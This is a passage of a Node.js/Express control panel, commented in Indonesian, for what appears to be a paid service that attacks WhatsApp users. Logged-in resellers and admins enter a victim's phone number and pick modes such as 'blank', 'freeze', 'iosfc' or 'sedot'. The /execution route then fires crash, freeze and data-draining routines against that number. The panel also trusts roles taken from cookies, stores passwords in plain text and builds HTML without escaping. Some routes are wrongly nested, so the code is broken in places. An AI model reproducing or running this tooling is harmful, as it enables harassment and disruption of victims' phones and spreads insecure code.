  { title: "Nina", url: "https://files.catbox.moe/e77qlu.m4a" },
  { title: "Tarot", url: "https://files.catbox.moe/m8h7z4.mp3" },
  { title: "O.Tuan", url: "https://files.catbox.moe/udh1c3.m4a" }
];

let currentSongIndex = 0;
const musicPlayer = document.getElementById("musicPlayer");
const playBtn = document.getElementById("playBtn");
const progressBar = document.getElementById("progressBar");
const currentTitle = document.getElementById("currentTitle");
const playlistContainer = document.getElementById("playlist");

// Generate playlist
playlist.forEach((song, index) => {
  const li = document.createElement("li");
  li.textContent = song.title;
  li.classList.add("playlist-item");
  li.onclick = () => { 
    currentSongIndex = index; 
    loadSong(currentSongIndex, true); // true = langsung play
  };
  playlistContainer.appendChild(li);
});

// Load song
function loadSong(index, autoplay = false) {
  musicPlayer.src = playlist[index].url;
  currentTitle.textContent = playlist[index].title;
  highlightActiveSong();
  if (autoplay) {
    musicPlayer.play();
    playBtn.textContent = "❚❚";
  } else {
    playBtn.textContent = "▶";
  }
}

// Highlight active song
function highlightActiveSong() {
  [...playlistContainer.children].forEach((li, idx) => {
    li.classList.toggle("active", idx === currentSongIndex);
  });
}

// Play / Pause
function togglePlay() {
  if (musicPlayer.paused) {
    musicPlayer.play();
    playBtn.textContent = "❚❚";
  } else {
    musicPlayer.pause();
    playBtn.textContent = "▶";
  }
}

// Next / Prev
function nextSong() {
  currentSongIndex = (currentSongIndex + 1) % playlist.length;
  loadSong(currentSongIndex, true);
}

function prevSong() {
  currentSongIndex = (currentSongIndex - 1 + playlist.length) % playlist.length;
  loadSong(currentSongIndex, true);
}

// Auto next
musicPlayer.addEventListener("ended", nextSong);

// Update progress bar safely
musicPlayer.addEventListener("timeupdate", () => {
  if (!isNaN(musicPlayer.duration)) {
    const progress = (musicPlayer.currentTime / musicPlayer.duration) * 100;
    progressBar.value = progress;
  }
});

// Seek music
progressBar.addEventListener("input", () => {
  if (!isNaN(musicPlayer.duration)) {
    musicPlayer.currentTime = (progressBar.value / 100) * musicPlayer.duration;
  }
});

// Load pertama kali tanpa autoplay
loadSong(currentSongIndex, false);

  // TOAST
  function showToast(message){
    const toast = document.getElementById('toast');
    toast.innerText = message;
    toast.style.display = 'block';
    toast.style.left = '100%';
    setTimeout(()=>{ toast.style.left = '5%'; }, 50);
    setTimeout(()=>{ toast.style.left = '100%'; }, 4000);
    setTimeout(()=>{ toast.style.display = 'none'; }, 4600);
  }
</script>
</body>
</html>
`;
};


// Appp Get root Server \\
app.use(bodyParser.urlencoded({ extended: true }));


app.get("/", (req, res) => {
  const username = req.cookies.sessionUser;
  const role = req.cookies.sessionRole;
  const isLoggedIn = req.cookies.isLoggedIn;

  if (username && role && isLoggedIn === "true") {
    const users = getUsers();
    const user = users.find(u => u.username === username && u.role === role);

    // Pastikan user ditemukan & belum expired
    if (user && (!user.expired || Date.now() < user.expired)) {
      return res.redirect("/execution");
    }
  }

  // Jika belum login / expired, arahkan ke halaman login awal
  const filePath = path.join(__dirname, "Titans", "index.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  // Jika masih login dan belum expired, langsung lempar ke /execution
  if (username && currentUser && currentUser.expired && Date.now() < currentUser.expired) {
    return res.redirect("/execution");
  }

  const filePath = path.join(__dirname, "Titans", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, password } = req.body;
  const users = getUsers();
  const user = users.find(u => u.username === username && u.password === password);

  if (!user || (user.expired && Date.now() > user.expired)) {
    return res.redirect("/login?msg=Login%20gagal%20atau%20expired");
  }

  // Cek apakah sedang login di device lain
  if (user.isLoggedIn && user.role !== "owner") {
  return res.redirect("/login?msg=User%20sudah%20login%20di%20device%20lain");
}

  // Set user sebagai login
  user.isLoggedIn = true;
    console.log(`[ ${chalk.green('LogIn')} ] -> ${user.username}`);
  saveUsers(users);

  const oneDay = 24 * 60 * 60 * 1000;

  res.cookie("sessionUser", username, {
  maxAge: 24 * 60 * 60 * 1000, // 1 hari
  httpOnly: true,
  sameSite: "lax"
});
res.cookie("sessionRole", user.role, {
  maxAge: 24 * 60 * 60 * 1000,
  httpOnly: true,
  sameSite: "lax"
});
  return res.redirect("/execution");
});


app.get("/userlist", (req, res) => {
  const role = req.cookies.sessionRole;
  const currentUsername = req.cookies.sessionUser;

  if (!["resseller", "admin" , "owner"].includes(role)) {
    return res.send("🚫 Akses ditolak.");
  }
  
  app.get("/chat", (req, res) => {
  res.json(getChat());
});

app.post("/chat", express.json(), (req, res) => {
  const username = req.cookies.sessionUser || "Guest";
  const role = req.cookies.sessionRole || "user";
  const message = (req.body.message || "").trim();

  if (!message) return res.status(400).json({ error: "Pesan kosong" });

  const chats = getChat();
  const newMessage = {
    user: username,
    role: role,
    message: message,
    time: Date.now()
  };
  chats.push(newMessage);
  saveChat(chats);

  res.json({ success: true });
});

  const users = getUsers();

  const tableRows = users.map(user => {
    const isProtected =
  user.username === currentUsername || // tidak bisa hapus diri sendiri
  (role === "resseller" && user.role !== "user") || // resseller hanya hapus user
  (role === "admin" && (user.role === "admin" || user.role === "owner")) || // admin gak bisa hapus admin/owner
  (role !== "owner" && user.role === "owner"); // selain owner gak bisa hapus owner

    return `
      <tr>
        <td>${user.username}</td>
        <td>${user.role.charAt(0).toUpperCase() + user.role.slice(1)}</td>
        <td>${new Date(user.expired).toLocaleString("id-ID")}</td>
        <td>
            ${isProtected ? `<span class="icon-disabled">
  <i class="fas fa-times"></i>
</span>` : `  
                <form method="POST" action="/hapususer" style="display:inline">
                <input type="hidden" name="username" value="${user.username}" />
                <button type="submit" style="margin-right:10px;">Delete</button>
        </form>
  `}
  ${(
  role === "owner" ||
  (role === "admin" && (user.role === "user" || user.role === "resseller")) ||
  (role === "resseller" && user.role === "user")
)
      ? `
      <a href="/edituser?username=${user.username}"><button>Edit</button></a>
      `: ""}
    </td>
      </tr>
    `;
  }).join("");

  const html = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Daftar User</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
  font-family: 'Poppins', sans-serif;
  background: #000;
  color: #3C44D5;
  min-height: 100vh;
  padding: 16px;
  position: relative;
  overflow-y: auto;
  overflow-x: hidden;
}

    #particles {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 1;
    }

    h2 {
      text-align: center;
      margin-bottom: 16px;
      color: #2B33DD;
      font-size: 22px;
      font-family: 'Poppins', sans-serif;
    }

    .table-container {
      overflow-x: auto;
      border-radius: 10px;
      border: 1px solid #2C2BE2;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(5px);
      font-size: 14px;
      margin-bottom: 20px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 360px;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #263BEE;
      font-family: 'Poppins', sans-serif;
    }

    th, td {
      padding: 10px;
      text-align: left;
      border-bottom: 1px solid #2B2CE2;
      white-space: nowrap;
    }

    th {
      background: rgba(26, 0, 26, 0.8);
      color: #2B2EFF;
    }

    td {
      background: rgba(13, 0, 13, 0.7);
    }

    button {
      background: #2B4DE2;
      color: white;
      padding: 6px 10px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 13px;
    }

    .icon-disabled {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  width: 64px;
  height: 32px;  
  color: #ff5555;
  font-size: 18px;
  border-radius: 6px;
}

   .icon-disabled i {
  pointer-events: none;
}

    .back-btn, #toggleFormBtn {
  display: block;
  width: 100%;
  padding: 14px;
  margin: 16px auto;
  background: #000B82;
  color: white;
  text-align: center;
  border-radius: 10px;
  text-decoration: none;
  font-size: 15px;
  font-weight: bold;
  font-family: 'Poppins', sans-serif;
  border: none;
  cursor: pointer;
  transition: 0.3s;
  box-sizing: border-box;
}

    #userFormContainer {
      display: none;
      margin-top: 20px;
      background: rgba(0, 2, 26, 0.8);
      padding: 20px;
      border-radius: 10px;
      border: 1px solid #2B3BE2;
      backdrop-filter: blur(5px);
    }

    #userFormContainer input,
    #userFormContainer select {
      padding: 10px;
      width: 100%;
      border-radius: 8px;
      border: none;
      background: #01001A;
      color: #2748EC;
      margin-bottom: 12px;
    }

    #userFormContainer button[type="submit"] {
      width: 100%;
      padding: 14px;
      background: #2B61E2;
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      box-sizing: border-box;
      margin-top: 10px;
      font-family: 'Poppins', sans-serif;
    }

    @media (max-width: 600px) {
      h2 { font-size: 18px; }
      table { font-size: 13px; }
      th, td { padding: 8px; }
      button, .back-btn, #toggleFormBtn { font-size: 13px; }
    }
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="content">
    <h2>List User</h2>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th>Username</th>
            <th>Role</th>
            <th>Expired</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <button id="toggleFormBtn"><i class="fas fa-user-plus"></i> Add User</button>

<div id="userFormContainer">
  <form action="/adduser" method="POST">
    <label>Username</label>
    <input type="text" name="username" placeholder="Username" required>
    <label>Password</label>
    <input type="text" name="password" placeholder="Password" required>
    <label>Durasi</label>
    <input type="number" name="durasi" placeholder="Duration (days)" required min="1">
    
    <label>Role</label>
    <select id="roleSelect" name="role" required></select>

    <button type="submit">Add User</button>
  </form>
</div>

    <a href="/execution" class="back-btn"><i class="fas fa-arrow-left"></i> Dashboard</a>
    
<script>
  const currentRole = "${role}";
  const roleOptions = {
    owner: ["user", "resseller", "admin"],
    admin: ["user", "resseller"],
    resseller: ["user"]
  };
  const labels = {
    user: "User",
    resseller: "resseller",
    admin: "Admin"
  };

  const allowedRoles = roleOptions[currentRole] || [];
  const roleSelect = document.getElementById("roleSelect");

  allowedRoles.forEach(role => {
    const opt = document.createElement("option");
    opt.value = role;
    opt.textContent = labels[role];
    roleSelect.appendChild(opt);
  });
</script>

  <script>
    $('#particles').particleground({
      dotColor: '#ffffff',
      lineColor: '#9932cc',
      minSpeedX: 0.1,
      maxSpeedX: 0.3,
      minSpeedY: 0.1,
      maxSpeedY: 0.3,
      density: 10000,
      particleRadius: 3
    });

    const toggleBtn = document.getElementById("toggleFormBtn");
    const form = document.getElementById("userFormContainer");

    toggleBtn.addEventListener("click", () => {
      const isHidden = form.style.display === "none" || form.style.display === "";
      form.style.display = isHidden ? "block" : "none";
      toggleBtn.innerHTML = isHidden
        ? '<i class="fas fa-times"></i> Cancell'
        : '<i class="fas fa-user-plus"></i> Add User';
    });
  </script>
</body>
</html>
  `;
  res.send(html);
});


// Tambahkan di bawah route lain
app.post("/adduser", (req, res) => {
  const sessionRole = req.cookies.sessionRole;
  const sessionUser = req.cookies.sessionUser;
  const { username, password, role, durasi } = req.body;

  // Validasi input
  if (!username || !password || !role || !durasi) {
    return res.send("❌ Lengkapi semua kolom.");
  }

  // Cek hak akses berdasarkan role pembuat
  if (sessionRole === "user") {
    return res.send("🚫 User tidak bisa membuat akun.");
  }

  if (sessionRole === "resseller" && role !== "user") {
    return res.send("🚫 resseller hanya boleh membuat user biasa.");
  }

  if (sessionRole === "admin" && role === "admin") {
    return res.send("🚫 Admin tidak boleh membuat admin lain.");
  }

  const users = getUsers();

  // Cek username sudah ada
  if (users.some(u => u.username === username)) {
    return res.send("❌ Username sudah terdaftar.");
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;

  users.push({
    username,
    password,
    expired,
    role,
    telegram_id: req.cookies.sessionID,
    isLoggedIn: false
  });

  saveUsers(users);
  res.redirect("/userlist");
});

app.post("/hapususer", (req, res) => {
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;
  const { username } = req.body;

  const users = getUsers();
  const targetUser = users.find(u => u.username === username);

  if (!targetUser) {
    return res.send("❌ User tidak ditemukan.");
  }

  // Tidak bisa hapus diri sendiri
  if (sessionUsername === username) {
    return res.send("❌ Tidak bisa hapus akun sendiri.");
  }

  // resseller hanya boleh hapus user biasa
  if (sessionRole === "resseller" && targetUser.role !== "user") {
    return res.send("❌ resseller hanya bisa hapus user biasa.");
  }

  // Admin tidak boleh hapus admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa hapus admin lain.");
  }

  // Admin/resseller tidak boleh hapus owner
  if (targetUser.role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa menghapus owner.");
  }

  // Lanjut hapus
  const filtered = users.filter(u => u.username !== username);
  saveUsers(filtered);
  res.redirect("/userlist");
});


app.get("/edituser", (req, res) => {
  const role = req.cookies.sessionRole;
  const currentUser = req.cookies.sessionUser;
  const username = req.query.username;

  if (!["resseller", "admin", "owner"].includes(role)) {
    return res.send("🚫 Akses ditolak.");
  }

  if (!username) {
    return res.send("❗ Username tidak valid.");
  }

  const users = getUsers();
  const user = users.find(u => u.username === username);

  if (!user) {
    return res.send("❌ User tidak ditemukan.");
  }

  // 🔒 Proteksi akses edit
  if (username === currentUser) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  if (role === "resseller" && user.role !== "user") {
    return res.send("❌ resseller hanya boleh edit user biasa.");
  }

  if (role === "admin" && user.role === "admin") {
    return res.send("❌ Admin tidak bisa edit admin lain.");
  }

  // 🔒 Tentukan opsi role yang boleh diedit
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user" ${user.role === "user" ? 'selected' : ''}>User</option>
      <option value="resseller" ${user.role === "resseller" ? 'selected' : ''}>resseller</option>
      <option value="admin" ${user.role === "admin" ? 'selected' : ''}>Admin</option>
      <option value="owner" ${user.role === "owner" ? 'selected' : ''}>Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user" ${user.role === "user" ? 'selected' : ''}>User</option>
      <option value="resseller" ${user.role === "resseller" ? 'selected' : ''}>resseller</option>
    `;
  } else {
    // resseller tidak bisa edit role
    roleOptions = `<option value="${user.role}" selected hidden>${user.role}</option>`;
  }

  const now = Date.now();
  const sisaHari = Math.max(0, Math.ceil((user.expired - now) / 86400000));
  const expiredText = new Date(user.expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit"
  });

  const html = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Edit User</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
  font-family: 'Poppins', sans-serif;
  background: #000000;
  color: #423EC8;
  min-height: 100vh;
  padding: 20px;
  position: relative;
  overflow-y: auto; 
  overflow-x: hidden;
}

    #particles {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 2;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #402BE2;
      font-family: 'Poppins', sans-serif;
      text-shadow: 0 0 8px rgba(43, 81, 226, 0.7);
    }

    .form-container {
      max-width: 480px;
      margin: 0 auto;
      background: rgba(0, 0, 0, 0.7);
      border: 1px solid #522BE2;
      padding: 24px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(46, 43, 226, 0.5);
      backdrop-filter: blur(8px);
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #26359B;
      font-family: 'Poppins', sans-serif;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin-bottom: 18px;
      border-radius: 10px;
      border: none;
      background: #1a001a;
      color:#4533D0 #4F2DCA;
      box-sizing: border-box;
    }

    .expired-info {
      margin-top: -12px;
      margin-bottom: 18px;
      font-size: 12px;
      color: #aaa;
      padding: 12px;
      background: #1a001a;
      border-radius: 10px;
      width: 100%;
      box-sizing: border-box;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #472BE2;
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      box-sizing: border-box;
      margin-top: 10px;
      font-family: 'Poppins', sans-serif;
    }

    button:hover {
      background: #4032CC;
      transform: scale(1.02);
    }

    .back-btn {
  display: block;
  width: 100%;
  padding: 14px;
  margin: 16px auto;
  background: #040082;
  color: white;
  text-align: center;
  border-radius: 10px;
  text-decoration: none;
  font-size: 15px;
  font-weight: bold;
  font-family: 'Poppins', sans-serif;
  border: none;
  cursor: pointer;
  transition: 0.3s;
  box-sizing: border-box;
}

    .back-btn:hover {
  background: #2a004a;
  transform: scale(1.02);
}

    @media (max-width: 500px) {
      body {
        padding: 16px;
      }

      .form-container {
        padding: 16px;
      }

      input, select {
        padding: 10px;
      }

      button {
        padding: 12px;
      }
    }
  </style>
</head>
<body>
  <!-- Efek Partikel -->
  <div id="particles"></div>

  <div class="content">
    <h2>Edit User: ${user.username}</h2>

    <div class="form-container">
      <form method="POST" action="/edituser">
        <input type="hidden" name="oldusername" value="${user.username}">

        <label>Username</label>
        <input type="text" name="username" value="${user.username}" required>

        <label>Password</label>
        <input type="text" name="password" value="${user.password}" required>

        <label>Expired</label>
        <input type="text" value="${expiredText} - Remaining time: ${sisaHari} more days" disabled class="expired-info">

        <label>Extend</label>
        <input type="number" name="extend" min="0" placeholder="Duration (days)">

        <label>Role</label>
        <select name="role">
          ${roleOptions}
        </select>

        <button type="submit"><i class="fas fa-save"></i> Save Changes</button>
      </form>
    </div>

    <a href="/userlist" class="back-btn" style="display:block; max-width:480px; margin:20px auto;"><i class="fas fa-arrow-left"></i> Back to User List</a>
  </div>

  <!-- JS Partikel -->
  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#ffffff',
        lineColor: '#8a2be2',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 10000,
        particleRadius: 3,
      });
    });
  </script>
</body>
</html>
`;

  res.send(html);
});


app.post("/edituser", (req, res) => {
  const { oldusername, username, password, extend, role } = req.body;
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;

  if (!["resseller", "admin", "owner"].includes(sessionRole)) {
    return res.send("❌ Akses ditolak.");
  }

  const users = getUsers();
  const index = users.findIndex(u => u.username === oldusername);
  if (index === -1) return res.send("❌ User tidak ditemukan.");

  const targetUser = users[index];

  // ❌ Tidak boleh edit akun sendiri
  if (sessionUsername === oldusername) {
    return res.send("❌ Tidak bisa mengedit akun sendiri.");
  }

  // ❌ resseller hanya bisa edit user dan tidak bisa ubah role
  if (sessionRole === "resseller") {
    if (targetUser.role !== "user") {
      return res.send("❌ resseller hanya boleh edit user biasa.");
    }
    if (role !== targetUser.role) {
      return res.send("❌ resseller tidak bisa mengubah role user.");
    }
  }

  // ❌ Admin tidak bisa edit admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa mengedit admin lain.");
  }

  // ❌ Admin tidak bisa set role jadi admin (buat yang lain)
  if (sessionRole === "admin" && role === "admin") {
    return res.send("❌ Admin tidak bisa mengubah role menjadi admin.");
  }

  // ❌ Hanya owner bisa set ke role owner
  if (role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa mengubah ke role owner.");
  }

  // ✅ Perpanjang expired
  const now = Date.now();
  const current = targetUser.expired > now ? targetUser.expired : now;
  const tambahan = parseInt(extend || "0") * 86400000;

  users[index] = {
    ...targetUser,
    username,
    password,
    expired: current + tambahan,
    role
  };

  saveUsers(users);
  res.redirect("/userlist");
});


app.post("/updateuser", (req, res) => {
  const { oldUsername, username, password, expired, role } = req.body;
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;

  if (!["resseller", "admin", "owner"].includes(sessionRole)) {
    return res.send("❌ Akses ditolak.");
  }

  const users = getUsers();
  const index = users.findIndex(u => u.username === oldUsername);
  if (index === -1) return res.send("❌ Username tidak ditemukan.");

  const targetUser = users[index];

  // ❌ Tidak boleh update akun sendiri
  if (sessionUsername === oldUsername) {
    return res.send("❌ Tidak bisa mengedit akun sendiri.");
  }

  // ❌ resseller hanya bisa edit user, dan tidak boleh ubah role
  if (sessionRole === "resseller") {
    if (targetUser.role !== "user") {
      return res.send("❌ resseller hanya bisa mengubah user biasa.");
    }
    if (role !== targetUser.role) {
      return res.send("❌ resseller tidak bisa mengubah role user.");
    }
  }

  // ❌ Admin tidak boleh edit admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa mengedit sesama admin.");
  }

  // ❌ Admin tidak boleh ubah role ke admin
  if (sessionRole === "admin" && role === "admin") {
    return res.send("❌ Admin tidak bisa mengubah role menjadi admin.");
  }

  // ❌ Hanya owner bisa set ke role owner
  if (role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa mengubah ke role owner.");
  }

  // ✅ Update username & password
  targetUser.username = username;
  targetUser.password = password;

  // ✅ Update expired
  const days = parseInt(expired);
  if (!isNaN(days) && days > 0) {
    const now = Date.now();
    const currentExp = targetUser.expired;
    targetUser.expired = currentExp > now
      ? currentExp + days * 86400000
      : now + days * 86400000;
  }

  // ✅ Ubah role jika owner, atau admin (dengan batasan)
  if (sessionRole === "owner") {
    targetUser.role = role;
  } else if (sessionRole === "admin" && (role === "user" || role === "resseller")) {
    targetUser.role = role;
  }

  saveUsers(users);
  res.redirect("/userlist");
});


app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.redirect("/login");

  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
    return res.redirect("/login");
  }

  const targetNumber = req.query.target;
  const mode = req.query.mode;
  const target = `${targetNumber}@s.whatsapp.net`;
  const usageData = getUsageLimit();
  const today = new Date().toISOString().split("T")[0];
  const uname = currentUser.username;
  const role = currentUser.role;

  if (!usageData[uname]) usageData[uname] = {};
  if (!usageData[uname][today]) usageData[uname][today] = 0;

  const limitPerRole = {
    user: 10,
    resseller: 25
  };

  if (limitPerRole[role] !== undefined) {
    const usedToday = usageData[uname][today];
    const limitToday = limitPerRole[role];

    if (usedToday >= limitToday) {
      console.log(`[LIMIT] ${uname} used ${usageData[uname][today]} / ${limitPerRole[role]}`);
      return res.send(executionPage("LIMIT TOAST", {
        message: `❌ Kamu sudah mencapai batas ${limitToday}x hari ini. Coba lagi besok.`,
        toastOnly: true
      }, false, currentUser, "", mode));
    }

    // Tambah counter kalau belum limit
    usageData[uname][today]++;
    saveUsageLimit(usageData);
  }

  if (sessions.size === 0) {
    return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
      message: "Tunggu sampai maintenance selesai..."
    }, false, currentUser, "", mode));
  }

  if (!targetNumber) {
    if (!mode) {
      return res.send(executionPage("✅ Server ON", {
        message: "Pilih mode yang ingin digunakan."
      }, true, currentUser, "", ""));
    }

          if (["invis", "ios", "sedot", "freeze", "blank", "combo"].includes(mode)) {
      return res.send(executionPage("✅ Server ON", {
        message: "Masukkan nomor target (62xxxxxxxxxx)."
      }, true, currentUser, "", mode));
    }

    return res.send(executionPage("❌ Mode salah", {
      message: "Mode tidak dikenali. Gunakan ?mode=androdelay atau ?mode=iosfc atau ?mode=androdelay2."
    }, false, currentUser, "", ""));
  }

  if (!/^\d+$/.test(targetNumber)) {
    return res.send(executionPage("❌ Format salah", {
      target: targetNumber,
      message: "Nomor harus hanya angka dan diawali dengan nomor negara"
    }, true, currentUser, "", mode));
  }

  try {
    if (mode === "invis") {
      DelayAndro(24, target);
      DelayAndro2(24, target);
    } else if (mode === "iosfc") {    
      Fcios(24, target);
    } else if (mode === "combo") {    
      DelayAndro(24, target);
      DelayAndro2(target);
    } else if (mode === "blank") {    
      NotifXButton(target);
      BlankScreens(target);
      callSystem(target);
      FreezePackk(target);
      Blank_Pack(target);
      frezeeClick(target);
    } else if (mode === "freeze") {    
     NotifXButton(target);
      BlankScreens(target);
      callSystem(target);
      FreezePackk(target);
      Blank_Pack(target);
      frezeeClick(target);    
    } else if (mode === "sedot") {
      invisibleAlbumQuota(24, target);
      invisXAlbum(24, target);
    } else {
      throw new Error("Mode tidak dikenal.");
    }

    return res.send(executionPage("✅ S U C C E S", {
      target: targetNumber,
      timestamp: new Date().toLocaleString("id-ID"),
      message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`,
      cleanURL: true  // Parameter baru untuk memberi tahu client membersihkan URL
    }, false, currentUser, "", mode, true));
  } catch (err) {
    return res.send(executionPage("❌ Gagal kirim", {
      target: targetNumber,
      message: err.message || "Terjadi kesalahan saat pengiriman."
    }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
  }
});

app.get("/logout", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.redirect("/");

  const users = getUsers();
  const user = users.find(u => u.username === username);
  if (user && user.isLoggedIn) {
  user.isLoggedIn = false;
    console.log(`[ ${chalk.red('LogOut')} ] -> ${user.username}`);
    saveUsers(users);
  }

  // 🔥 Clear semua cookies biar gak nyangkut
  res.clearCookie("sessionUser");
  res.clearCookie("sessionRole");
  res.clearCookie("isLoggedIn", "true"); // <== ini yang kurang
  res.redirect("/");
});

app.listen(PORT, () => {
  console.log(`${chalk.green('Server Active On Port')} ${VPS}:${PORT}`);
});
